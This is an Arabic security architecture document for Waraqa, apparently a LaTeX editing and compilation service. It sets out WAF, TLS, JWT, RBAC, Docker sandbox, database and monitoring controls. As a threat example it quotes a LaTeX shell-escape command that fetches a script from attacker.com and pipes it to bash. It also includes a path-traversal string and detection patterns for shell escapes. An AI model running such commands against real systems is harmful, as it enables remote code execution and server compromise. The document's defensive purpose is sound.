# Waraqa — وثيقة الأمن السيبراني الشاملة

> المبدأ: **Defense in Depth** — سبع طبقات حماية متداخلة، اختراق طبقة لا يعني اختراق النظام.
> المرجع: OWASP Top 10 · CIS Controls · NIST CSF · ISO 27001

---

## خريطة طبقات الحماية

```
الإنترنت
    │
    ▼
┌─────────────────────────────────────┐
│  الطبقة 1: حافة الشبكة             │
│  Cloudflare WAF + DDoS Protection   │
└──────────────────┬──────────────────┘
                   │
┌──────────────────▼──────────────────┐
│  الطبقة 2: البنية التحتية           │
│  Nginx + TLS 1.3 + Rate Limiting    │
└──────────────────┬──────────────────┘
                   │
┌──────────────────▼──────────────────┐
│  الطبقة 3: بوابة API                │
│  JWT + API Keys + Input Validation  │
└──────────────────┬──────────────────┘
                   │
┌──────────────────▼──────────────────┐
│  الطبقة 4: منطق التطبيق            │
│  AuthZ + RBAC + Business Rules      │
└──────────────────┬──────────────────┘
                   │
┌──────────────────▼──────────────────┐
│  الطبقة 5: عزل التجميع             │
│  Docker Sandbox + Seccomp + No-Net  │
└──────────────────┬──────────────────┘
                   │
┌──────────────────▼──────────────────┐
│  الطبقة 6: قواعد البيانات          │
│  Encryption + RLS + Least Privilege │
└──────────────────┬──────────────────┘
                   │
┌──────────────────▼──────────────────┐
│  الطبقة 7: المراقبة والاستجابة     │
│  SIEM + Alerting + Incident Plan    │
└─────────────────────────────────────┘
```

---

## الطبقة 1 — حافة الشبكة (Cloudflare)

### DDoS Protection
```
- تفعيل Cloudflare Magic Transit لامتصاص هجمات L3/L4
- حد تلقائي: أي IP يرسل > 1000 طلب/دقيقة → حظر تلقائي 24 ساعة
- تفعيل "Under Attack Mode" عند اكتشاف هجوم
- Bot Fight Mode: حظر بوتات الزحف الضارة تلقائياً
```

### Web Application Firewall (WAF)
```
قواعد مُفعَّلة:
  ✓ OWASP Core Rule Set 3.3
  ✓ حظر SQL Injection
  ✓ حظر XSS
  ✓ حظر Path Traversal  (../../etc/passwd)
  ✓ حظر طلبات من دول ذات نشاط هجومي عالٍ 
  ✓ حظر User-Agents المشبوهة
  ✓ حظر الطلبات التي تحتوي على LaTeX shell escape (\write18)
```

### إعدادات DNS
```
- إخفاء IP الحقيقي للخادم خلف Cloudflare Proxy
- تفعيل DNSSEC لمنع DNS Spoofing
- CAA Records: السماح فقط لـ Let's Encrypt بإصدار شهادات
```

---

## الطبقة 2 — البنية التحتية (Nginx + TLS)

### إعداد TLS

```nginx
# nginx.conf

ssl_protocols TLSv1.3;                    # TLS 1.3 فقط — إلغاء 1.0 و 1.1 و 1.2
ssl_ciphers TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256;
ssl_prefer_server_ciphers off;
ssl_session_timeout 1d;
ssl_session_cache shared:SSL:50m;
ssl_session_tickets off;                  # منع Session Resumption Attacks

# HSTS — إجبار HTTPS لمدة سنتين
add_header Strict-Transport-Security "max-age=63072000; includeSubDomains; preload" always;

# منع تضمين الموقع في iframe خارجي (Clickjacking)
add_header X-Frame-Options "DENY" always;

# منع MIME Sniffing
add_header X-Content-Type-Options "nosniff" always;

# Content Security Policy
add_header Content-Security-Policy "
  default-src 'self';
  script-src 'self' 'nonce-{RANDOM}';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: blob:;
  connect-src 'self' wss://waraqa.com;
  frame-ancestors 'none';
  base-uri 'self';
  form-action 'self';
" always;

# إخفاء نسخة Nginx
server_tokens off;
more_clear_headers Server;
```

### Rate Limiting في Nginx

```nginx
# تعريف مناطق التحديد
limit_req_zone $binary_remote_addr zone=global:10m    rate=100r/m;
limit_req_zone $binary_remote_addr zone=auth:10m      rate=5r/m;
limit_req_zone $binary_remote_addr zone=compile:10m   rate=10r/m;
limit_req_zone $binary_remote_addr zone=ai:10m        rate=20r/m;

server {
    # عام
    location /api/ {
        limit_req zone=global burst=20 nodelay;
    }
    # تسجيل الدخول — أشد تقييداً
    location /api/auth/login {
        limit_req zone=auth burst=3 nodelay;
        limit_req_status 429;
    }
    # التجميع
    location /api/compile {
        limit_req zone=compile burst=5 nodelay;
    }
    # الذكاء الاصطناعي
    location /api/ai {
        limit_req zone=ai burst=10 nodelay;
    }
}
```

---

## الطبقة 3 — بوابة API (API Gateway)

### التحقق من JWT

```js
// middleware/verifyToken.js

import jwt from 'jsonwebtoken';
import { redisClient } from '../config/redis.js';

export async function verifyToken(req, res, next) {
  const authHeader = req.headers.authorization;

  if (!authHeader?.startsWith('Bearer ')) {
    return res.status(401).json({ error: 'لا يوجد توكن' });
  }

  const token = authHeader.split(' ')[1];

  // التحقق من قائمة التوكنات الملغاة (Blacklist)
  const isRevoked = await redisClient.get(`revoked:${token}`);
  if (isRevoked) {
    return res.status(401).json({ error: 'التوكن ملغى' });
  }

  try {
    const payload = jwt.verify(token, process.env.JWT_SECRET, {
      algorithms: ['HS256'],      // تحديد الخوارزمية صراحةً (منع alg:none attack)
      issuer: 'waraqa.com',
      audience: 'waraqa-users'
    });

    req.user = payload;
    next();
  } catch (err) {
    if (err.name === 'TokenExpiredError') {
      return res.status(401).json({ error: 'انتهت صلاحية التوكن' });
    }
    return res.status(401).json({ error: 'توكن غير صالح' });
  }
}
```

### التحقق من المدخلات (Input Validation)

```js
// middleware/validate.js
import { z } from 'zod';
import DOMPurify from 'isomorphic-dompurify';

// مخططات التحقق
export const schemas = {

  compileRequest: z.object({
    projectId: z.string().uuid(),
    mainFile:  z.string()
                .max(255)
                .regex(/^[\w\-. /]+\.tex$/, 'اسم ملف غير صالح'),
    compiler:  z.enum(['pdflatex', 'xelatex', 'lualatex'])
  }),

  aiRequest: z.object({
    prompt: z.string()
              .min(1)
              .max(2000)
              .transform(s => DOMPurify.sanitize(s)),  // تنظيف HTML
    feature: z.enum(['autocomplete', 'explain-error', 'generate', 'edit-content'])
  }),

  register: z.object({
    email:    z.string().email().max(255),
    password: z.string()
                .min(8)
                .max(128)
                .regex(/^(?=.*[A-Z])(?=.*[0-9])(?=.*[!@#$%^&*])/, 
                       'كلمة المرور ضعيفة'),
    name:     z.string().min(2).max(100).trim()
  })
};

export function validate(schema) {
  return (req, res, next) => {
    const result = schema.safeParse(req.body);
    if (!result.success) {
      return res.status(400).json({
        error: 'بيانات غير صالحة',
        details: result.error.flatten().fieldErrors
      });
    }
    req.body = result.data;  // استبدال البيانات بالنسخة المنقّحة
    next();
  };
}
```

### الحماية من Brute Force

```js
// middleware/bruteForce.js
import { redisClient } from '../config/redis.js';

const MAX_ATTEMPTS    = 5;
const WINDOW_SECONDS  = 900;   // 15 دقيقة
const LOCKOUT_SECONDS = 3600;  // ساعة كاملة

export async function loginProtection(req, res, next) {
  const ip    = req.ip;
  const email = req.body.email?.toLowerCase();
  const key   = `login_attempts:${ip}:${email}`;

  const attempts = await redisClient.incr(key);

  if (attempts === 1) {
    await redisClient.expire(key, WINDOW_SECONDS);
  }

  if (attempts > MAX_ATTEMPTS) {
    const lockKey = `locked:${ip}:${email}`;
    await redisClient.set(lockKey, '1', 'EX', LOCKOUT_SECONDS);

    // تنبيه فوري للمسؤول
    await alertAdmin({
      type: 'BRUTE_FORCE',
      ip,
      email,
      attempts
    });

    return res.status(429).json({
      error: 'تم تجاوز عدد المحاولات. حاول بعد ساعة.',
      retryAfter: LOCKOUT_SECONDS
    });
  }

  next();
}
```

---

## الطبقة 4 — منطق التطبيق (RBAC + AuthZ)

### نظام الصلاحيات

```js
// config/permissions.js

export const ROLES = {
  OWNER:  'owner',
  EDITOR: 'editor',
  VIEWER: 'viewer'
};

export const PERMISSIONS = {
  'project:read':    [ROLES.OWNER, ROLES.EDITOR, ROLES.VIEWER],
  'project:write':   [ROLES.OWNER, ROLES.EDITOR],
  'project:delete':  [ROLES.OWNER],
  'project:share':   [ROLES.OWNER],
  'file:read':       [ROLES.OWNER, ROLES.EDITOR, ROLES.VIEWER],
  'file:write':      [ROLES.OWNER, ROLES.EDITOR],
  'file:delete':     [ROLES.OWNER, ROLES.EDITOR],
  'compile:run':     [ROLES.OWNER, ROLES.EDITOR],
  'ai:use':          [ROLES.OWNER, ROLES.EDITOR],
};

export function can(userRole, permission) {
  return PERMISSIONS[permission]?.includes(userRole) ?? false;
}
```

```js
// middleware/authorize.js

export function authorize(permission) {
  return async (req, res, next) => {
    const { projectId } = req.params;
    const userId = req.user.id;

    const member = await db.query(
      `SELECT role FROM project_members
       WHERE project_id = $1 AND user_id = $2`,
      [projectId, userId]
    );

    if (!member.rows[0]) {
      return res.status(403).json({ error: 'لا تملك صلاحية الوصول لهذا المشروع' });
    }

    if (!can(member.rows[0].role, permission)) {
      return res.status(403).json({ error: 'لا تملك صلاحية تنفيذ هذا الإجراء' });
    }

    req.userRole = member.rows[0].role;
    next();
  };
}
```

### الحماية من IDOR

```js
// كل استعلام يشترط ملكية المستخدم — لا يوجد استعلام بالـ ID فقط

// ❌ خطأ — مفتوح لهجوم IDOR
const file = await db.query('SELECT * FROM files WHERE id = $1', [fileId]);

// ✅ صحيح — التحقق من الملكية في نفس الاستعلام
const file = await db.query(`
  SELECT f.* FROM files f
  JOIN projects p ON f.project_id = p.id
  JOIN project_members pm ON p.id = pm.project_id
  WHERE f.id = $1 AND pm.user_id = $2
`, [fileId, req.user.id]);

if (!file.rows[0]) {
  return res.status(404).json({ error: 'الملف غير موجود' }); // لا نقول "غير مصرح"
}
```

---

## الطبقة 5 — عزل بيئة التجميع (Docker Sandbox)

### أخطر نقطة في النظام

> ملف `.tex` يمكن أن يحتوي على أوامر خبيثة مثل:
> `\immediate\write18{curl attacker.com/shell.sh | bash}`

### الحماية الكاملة

```js
// services/compile.service.js

const SAFE_CONTAINER_CONFIG = {
  Image: 'waraqa/texlive:latest',

  // ═══ عزل الشبكة ═══
  NetworkDisabled: true,               // ❌ صفر اتصال بالإنترنت

  // ═══ نظام الملفات ═══
  HostConfig: {
    Binds: [
      `${tmpDir}:/workspace:rw`,       // مجلد العمل فقط
      '/dev/null:/dev/urandom:ro'      // منع قراءة entropy
    ],
    ReadonlyRootfs: true,              // نظام الملفات للقراءة فقط
    Tmpfs: {
      '/tmp':       'size=50m,mode=1777',
      '/workspace': 'size=100m'
    },

    // ═══ موارد النظام ═══
    Memory:           512 * 1024 * 1024,  // 512MB
    MemorySwap:       512 * 1024 * 1024,  // إلغاء Swap
    CpuPeriod:        100000,
    CpuQuota:         50000,              // 50% نواة واحدة
    PidsLimit:        50,                 // حد العمليات (منع Fork Bomb)
    Ulimits: [
      { Name: 'nofile', Soft: 100, Hard: 100 },  // حد الملفات المفتوحة
      { Name: 'fsize',  Soft: 50 * 1024 * 1024 } // حد حجم الملف = 50MB
    ],

    // ═══ صلاحيات Kernel ═══
    CapDrop: ['ALL'],                  // إسقاط كل صلاحيات Linux
    CapAdd:  [],                       // لا إضافة أي صلاحية
    SecurityOpt: [
      'no-new-privileges:true',        // منع رفع الصلاحيات
      'seccomp=./docker/seccomp/texlive.json'  // فلتر syscalls مخصص
    ],
    AutoRemove: true                   // حذف Container فور الانتهاء
  },

  // ═══ المستخدم ═══
  User: '1001:1001',                   // مستخدم غير مميز (non-root)

  // ═══ متغيرات البيئة ═══
  Env: [
    'HOME=/tmp',
    'PATH=/usr/local/texlive/bin/x86_64-linux'
    // ❌ لا أسرار ولا مفاتيح API داخل Container التجميع
  ]
};
```

### فلتر Seccomp لـ TexLive

```json
// docker/seccomp/texlive.json
{
  "defaultAction": "SCMP_ACT_ERRNO",
  "syscalls": [
    {
      "names": [
        "read", "write", "open", "openat", "close",
        "stat", "fstat", "lstat", "access",
        "mmap", "mprotect", "munmap", "brk",
        "exit", "exit_group", "wait4", "waitpid",
        "fork", "clone", "execve",
        "getcwd", "chdir", "mkdir", "unlink",
        "getpid", "getuid", "getgid", "geteuid"
      ],
      "action": "SCMP_ACT_ALLOW"
    }
  ]
}
```

### مسح المخرجات قبل حفظها

```js
// التحقق من ملف PDF الناتج قبل رفعه
async function validatePdfOutput(pdfPath) {
  const stats = await fs.stat(pdfPath);

  // حد الحجم
  if (stats.size > 50 * 1024 * 1024) {
    throw new Error('PDF أكبر من الحد المسموح (50MB)');
  }

  // التحقق من Magic Bytes
  const buffer = Buffer.alloc(5);
  const fd = await fs.open(pdfPath, 'r');
  await fd.read(buffer, 0, 5, 0);
  await fd.close();

  if (buffer.toString() !== '%PDF-') {
    throw new Error('الملف الناتج ليس PDF صالحاً');
  }

  return true;
}
```

---

## الطبقة 6 — قواعد البيانات

### Row Level Security في Supabase/PostgreSQL

```sql
-- تفعيل RLS على كل الجداول
ALTER TABLE projects      ENABLE ROW LEVEL SECURITY;
ALTER TABLE files         ENABLE ROW LEVEL SECURITY;
ALTER TABLE project_members ENABLE ROW LEVEL SECURITY;
ALTER TABLE ai_usage      ENABLE ROW LEVEL SECURITY;

-- سياسة: المستخدم يرى مشاريعه فقط
CREATE POLICY "users_own_projects" ON projects
  FOR ALL USING (
    owner_id = auth.uid()
    OR id IN (
      SELECT project_id FROM project_members
      WHERE user_id = auth.uid()
    )
  );

-- سياسة: المستخدم يرى ملفات مشاريعه فقط
CREATE POLICY "users_own_files" ON files
  FOR ALL USING (
    project_id IN (
      SELECT id FROM projects WHERE owner_id = auth.uid()
      UNION
      SELECT project_id FROM project_members WHERE user_id = auth.uid()
    )
  );

-- سياسة: المستخدم يرى استهلاكه فقط
CREATE POLICY "users_own_usage" ON ai_usage
  FOR SELECT USING (user_id = auth.uid());
```

### تشفير البيانات الحساسة

```js
// utils/encryption.js
import crypto from 'crypto';

const ALGORITHM = 'aes-256-gcm';
const KEY = Buffer.from(process.env.ENCRYPTION_KEY, 'hex'); // 32 bytes

export function encrypt(text) {
  const iv = crypto.randomBytes(16);
  const cipher = crypto.createCipheriv(ALGORITHM, KEY, iv);

  let encrypted = cipher.update(text, 'utf8', 'hex');
  encrypted += cipher.final('hex');

  const authTag = cipher.getAuthTag();

  return `${iv.toString('hex')}:${authTag.toString('hex')}:${encrypted}`;
}

export function decrypt(encryptedData) {
  const [ivHex, authTagHex, encrypted] = encryptedData.split(':');

  const iv      = Buffer.from(ivHex, 'hex');
  const authTag = Buffer.from(authTagHex, 'hex');
  const decipher = crypto.createDecipheriv(ALGORITHM, KEY, iv);

  decipher.setAuthTag(authTag);

  let decrypted = decipher.update(encrypted, 'hex', 'utf8');
  decrypted += decipher.final('utf8');

  return decrypted;
}
```

### مبدأ الحد الأدنى من الصلاحيات (Least Privilege)

```sql
-- مستخدم التطبيق: لا صلاحية DROP أو TRUNCATE أبداً
CREATE ROLE waraqa_app LOGIN PASSWORD 'strong-password';
GRANT CONNECT ON DATABASE waraqa_db TO waraqa_app;
GRANT USAGE ON SCHEMA public TO waraqa_app;
GRANT SELECT, INSERT, UPDATE, DELETE ON ALL TABLES IN SCHEMA public TO waraqa_app;

-- مستخدم للقراءة فقط (للتقارير والمراقبة)
CREATE ROLE waraqa_readonly LOGIN PASSWORD 'another-strong-password';
GRANT CONNECT ON DATABASE waraqa_db TO waraqa_readonly;
GRANT SELECT ON ALL TABLES IN SCHEMA public TO waraqa_readonly;

-- ❌ لا أحد يملك DROP TABLE في الإنتاج
```

### منع SQL Injection

```js
// ❌ خطأ قاتل
const result = await db.query(
  `SELECT * FROM users WHERE email = '${email}'`
);

// ✅ Parameterized Queries دائماً
const result = await db.query(
  'SELECT * FROM users WHERE email = $1',
  [email]
);

// ✅ أو استخدام ORM مثل Prisma
const user = await prisma.user.findUnique({
  where: { email }
});
```

---

## الطبقة 7 — المراقبة والاستجابة (SIEM)

### تسجيل الأحداث الأمنية

```js
// utils/securityLogger.js
import winston from 'winston';

const securityLogger = winston.createLogger({
  level: 'info',
  format: winston.format.json(),
  transports: [
    new winston.transports.File({ filename: '/var/log/waraqa/security.log' }),
    // إرسال فوري لـ SIEM خارجي (مثل Grafana Loki)
    new winston.transports.Http({ host: process.env.LOKI_HOST })
  ]
});

// الأحداث الواجب تسجيلها
export const SecurityEvents = {
  LOGIN_SUCCESS:        (userId, ip)        => log('INFO',  'LOGIN_SUCCESS',        { userId, ip }),
  LOGIN_FAILED:         (email, ip)         => log('WARN',  'LOGIN_FAILED',         { email, ip }),
  BRUTE_FORCE:          (ip, email)         => log('ERROR', 'BRUTE_FORCE_DETECTED', { ip, email }),
  UNAUTHORIZED_ACCESS:  (userId, resource)  => log('WARN',  'UNAUTHORIZED_ACCESS',  { userId, resource }),
  SUSPICIOUS_LATEX:     (userId, projectId) => log('ERROR', 'SUSPICIOUS_LATEX',     { userId, projectId }),
  TOKEN_REVOKED:        (userId, reason)    => log('INFO',  'TOKEN_REVOKED',        { userId, reason }),
  RATE_LIMIT_HIT:       (ip, endpoint)      => log('WARN',  'RATE_LIMIT_HIT',       { ip, endpoint }),
  LARGE_FILE_UPLOAD:    (userId, size)      => log('WARN',  'LARGE_FILE_UPLOAD',    { userId, size }),
  AI_ABUSE_DETECTED:    (userId, count)     => log('ERROR', 'AI_ABUSE_DETECTED',    { userId, count }),
  ADMIN_ACTION:         (adminId, action)   => log('INFO',  'ADMIN_ACTION',         { adminId, action }),
};

function log(level, event, meta) {
  securityLogger.log(level, event, {
    ...meta,
    timestamp: new Date().toISOString(),
    service: 'waraqa'
  });
}
```

### قواعد التنبيه الفوري

```yaml
# alerting-rules.yaml

rules:
  - name: هجوم Brute Force
    condition: login_failures > 10 في دقيقتين من نفس الـ IP
    action: [حظر IP، إرسال بريد للمسؤول، تسجيل في SIEM]

  - name: استخدام غير طبيعي للذكاء الاصطناعي
    condition: ai_requests > 100 في ساعة من مستخدم واحد
    action: [تعليق الحساب مؤقتاً، تنبيه المسؤول]

  - name: محاولة هروب من Docker
    condition: seccomp_violation في compile container
    action: [إيقاف Container فوراً، حظر المستخدم، تنبيه عاجل]

  - name: LaTeX Shell Escape
    condition: كود يحتوي على \write18 أو \input{|
    action: [رفض التجميع، تسجيل الحادثة، مراجعة يدوية]

  - name: استنزاف قاعدة البيانات
    condition: queries > 500/دقيقة من نفس المستخدم
    action: [تفعيل Rate Limit على DB، تنبيه فوري]

  - name: حجم ملف مشبوه
    condition: ملف .tex > 5MB أو صورة > 20MB
    action: [رفض الرفع، تسجيل]
```

### فحص LaTeX قبل التجميع

```js
// utils/latexSanitizer.js

const DANGEROUS_PATTERNS = [
  /\\write18/i,                    // Shell Escape
  /\\immediate\\write18/i,
  /\\input\s*\{\s*\|/i,           // Pipe في \input
  /\\include\s*\{\s*\|/i,
  /\\openout\s+\d+\s+[^%\n]*\.\.(\/|\\)/i,  // Path Traversal
  /\\catcode.*\d+\s*=\s*0/i,      // تغيير Catcode للهروب
  /\\def\\.*\\write18/i,
  /--shell-escape/i,
  /\\directlua/i,                  // Lua Injection في LuaLaTeX
  /\\primitive/i
];

export function sanitizeLatex(content) {
  const violations = [];

  for (const pattern of DANGEROUS_PATTERNS) {
    if (pattern.test(content)) {
      violations.push(pattern.toString());
    }
  }

  if (violations.length > 0) {
    throw new SecurityError('كود LaTeX مشبوه', { violations });
  }

  return content;
}
```

---

## إدارة الأسرار (Secrets Management)

```
❌ لا أسرار في كود المصدر أبداً
❌ لا أسرار في Docker images
❌ لا أسرار في git history
❌ لا أسرار في environment variables للـ Container المحظور

✅ HashiCorp Vault في الإنتاج
✅ .env محلياً فقط وفي .gitignore
✅ GitHub Secrets في CI/CD
✅ دوران تلقائي للمفاتيح كل 90 يوم
```

```js
// config/secrets.js — قراءة من Vault في الإنتاج
import vault from 'node-vault';

export async function getSecret(key) {
  if (process.env.NODE_ENV === 'production') {
    const client = vault({ endpoint: process.env.VAULT_ADDR });
    await client.approleLogin({
      role_id:   process.env.VAULT_ROLE_ID,
      secret_id: process.env.VAULT_SECRET_ID
    });
    const { data } = await client.read(`secret/waraqa/${key}`);
    return data.value;
  }
  return process.env[key]; // تطوير محلي فقط
}
```

---

## السياسة الأمنية الشاملة

### كلمات المرور
```
- حد أدنى: 8 أحرف، حرف كبير، رقم، رمز خاص
- تشفير: bcrypt مع cost factor 12
- منع كلمات المرور الشائعة (قاموس HaveIBeenPwned)
- إجبار التغيير عند الاشتباه باختراق
```

### جلسات المستخدم
```
- Access Token:  15 دقيقة (في الذاكرة فقط، لا localStorage)
- Refresh Token: 30 يوم (HttpOnly Cookie + Secure + SameSite=Strict)
- تسجيل خروج: إلغاء Refresh Token من Redis فوراً
- جلسة واحدة نشطة لكل مستخدم (اختياري: متعددة مع إشعار)
```

### رفع الملفات
```
- أنواع مسموحة فقط: .tex .bib .sty .cls .png .jpg .pdf .eps
- فحص Magic Bytes (لا الاعتماد على الامتداد فقط)
- حد الحجم: 10MB للملفات النصية، 20MB للصور
- مسح أي metadata حساس من الصور (EXIF)
- تخزين في MinIO مع اسم عشوائي (UUID) لا اسم المستخدم الأصلي
```

### بيئة الإنتاج
```
- لا SSH مباشر للخوادم (استخدام Bastion Host)
- تحديث تلقائي لصور Docker كل أسبوع
- فحص أمني دوري بـ Trivy لكل Docker image
- نسخ احتياطية مشفرة كل 6 ساعات
- اختبار استعادة النسخ الاحتياطية شهرياً
```

---

## خطة الاستجابة للحوادث

```
المستوى 1 — تنبيه (Brute Force، Rate Limit):
  ├── حظر تلقائي فوري
  └── تسجيل + إشعار بريدي للمسؤول

المستوى 2 — حادثة (اشتباه باختراق حساب):
  ├── تجميد الحساب فوراً
  ├── إلغاء كل الجلسات النشطة
  ├── إشعار المستخدم بالبريد
  └── مراجعة السجلات يدوياً خلال ساعة

المستوى 3 — اختراق (محاولة هروب من Docker، اختراق DB):
  ├── إيقاف الخدمة المتضررة فوراً
  ├── عزل الخادم من الشبكة
  ├── إشعار الفريق الكامل
  ├── تحليل جنائي (Forensics)
  └── إشعار المستخدمين المتضررين خلال 72 ساعة
      (متطلب قانوني في كثير من الدول)
```

---

## الاعتماديات الأمنية

```json
{
  "helmet": "^7.0",
  "express-rate-limit": "^7.0",
  "bcryptjs": "^2.4",
  "jsonwebtoken": "^9.0",
  "zod": "^3.22",
  "isomorphic-dompurify": "^2.0",
  "node-vault": "^0.10",
  "winston": "^3.11",
  "dockerode": "^4.0"
}
```

---

## قائمة المراجعة قبل الإطلاق

```
الشبكة:
  ☐ Cloudflare WAF مفعّل
  ☐ TLS 1.3 فقط
  ☐ HSTS مع preload
  ☐ جميع Headers الأمنية موجودة

التطبيق:
  ☐ كل المدخلات تُتحقق منها بـ Zod
  ☐ لا SQL Injection (Parameterized فقط)
  ☐ RBAC مفعّل على كل endpoint
  ☐ IDOR محمي في كل استعلام

Docker:
  ☐ التجميع بدون شبكة
  ☐ مستخدم non-root
  ☐ Seccomp مفعّل
  ☐ حدود الموارد مضبوطة

قاعدة البيانات:
  ☐ RLS مفعّل على كل الجداول
  ☐ Least Privilege للمستخدمين
  ☐ النسخ الاحتياطية تعمل وتختبر

المراقبة:
  ☐ Security logs تُكتب
  ☐ التنبيهات مضبوطة
  ☐ خطة الاستجابة للحوادث موثقة
```

---

*Waraqa Security — يونيو 2026 — Defense in Depth*
